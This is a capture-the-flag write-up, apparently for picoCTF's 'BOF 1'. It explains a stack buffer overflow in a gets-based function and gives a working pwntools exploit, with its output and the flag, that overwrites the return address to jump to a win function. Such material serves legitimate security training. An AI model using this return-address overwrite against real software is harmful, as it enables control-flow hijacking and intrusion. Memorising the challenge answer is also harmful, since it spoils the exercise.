# BOF 1

## Code inspection

Looking at the `vuln` function, we see a clear buffer overflow vulnerability.

Our goal is to jump to the `win` function, which prints the flag.

## Memory layout

Using gdb, we can see that the buffer is at `ebp - 0x28`

```
0x0804929a <+25>:	lea    eax,[ebp-0x28]
0x0804929d <+28>:	push   eax
0x0804929e <+29>:	call   0x8049050 <gets@plt>

```

Let's see the memory layout:

```
[low]

buf             <----- EBP - 40

old_ebp         <----- EBP

return_address  <----- EBP + 4

[high]
```
## Getting the flag

Which means we need to overwrite the 40 bytes of local variables,
the old EBP, and then overwrite the return address to be the one we want.

```python
from pwn import *

exploit_str = "1" * 40 + "2" * 4

conn = connect("saturn.picoctf.net", 59710)

print(conn.recvline().decode())

exploit_str = exploit_str.encode() + p32(0x80491f6)

file = open("bof_exploit", "wb")
file.write(exploit_str)
file.close()

print("Sending {}".format(exploit_str))
conn.sendline(exploit_str)

print(conn.recvline().decode())
print(conn.recv())

conn.close()

```

We get:
```
[x] Opening connection to saturn.picoctf.net on port 59710
[x] Opening connection to saturn.picoctf.net on port 59710: Trying 18.217.86.78
[+] Opening connection to saturn.picoctf.net on port 59710: Done
Please enter your string: 

Sending b'11111111111111111111111111111111111111112222\xf6\x91\x04\x08'
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

b'picoCTF{addr3ss3s_ar3_3asy_ad2f467b}'
[*] Closed connection to saturn.picoctf.net port 59710

```